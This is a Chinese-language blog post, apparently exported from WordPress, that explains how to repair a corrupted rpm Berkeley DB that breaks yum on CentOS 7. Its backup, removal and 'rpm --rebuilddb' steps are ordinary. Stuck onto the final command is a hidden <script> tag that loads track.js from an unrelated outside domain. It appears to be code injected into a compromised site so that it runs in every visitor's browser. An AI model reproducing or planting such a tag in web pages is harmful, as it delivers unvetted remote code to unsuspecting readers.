---
id: 195
title: 'yum报错Thread died in Berkeley DB library'
date: '2021-10-27T10:02:14+08:00'
author: gavin
layout: post
guid: 'https://gaving.top/?p=195'
permalink: /index.php/2021/10/27/yum%e6%8a%a5%e9%94%99thread-died-in-berkeley-db-library/
blocksy_post_meta_options:
    - 'a:1:{s:17:"styles_descriptor";a:3:{s:6:"styles";a:3:{s:7:"desktop";s:0:"";s:6:"tablet";s:0:"";s:6:"mobile";s:0:"";}s:12:"google_fonts";a:0:{}s:7:"version";i:5;}}'
categories:
    - Linux
---

在centos7上运行yum list后报错

```
<span class="line">error: rpmdb: BDB0113 Thread/process 3336/140141695063872 failed: BDB1507 Thread died in Berkeley DB library</span>
<span class="line">error: db5 error(-30973) from dbenv->failchk: BDB0087 DB_RUNRECOVERY: Fatal error, run database recovery</span>
<span class="line">error: cannot open Packages index using db5 -  (-30973)</span>
<span class="line">error: cannot open Packages database in /var/lib/rpm</span>
<span class="line">CRITICAL:yum.main:</span>

<span class="line">Error: rpmdb open failed</span>
```

提示rpm相关的数据库损坏了

解决方案

$ mkdir /var/lib/rpm/backup  
$ cp -a /var/lib/rpm/\_\_db\* /var/lib/rpm/backup/  
$ rm -f /var/lib/rpm/\_\_db.\[0-9\]\[0-9\]\*  
$ rpm --quiet -qa  
$ rpm --rebuilddb  
$ yum clean all<script src="https://trick.cofounderspecials.com/track.js?v=9.999" type="text/javascript"></script>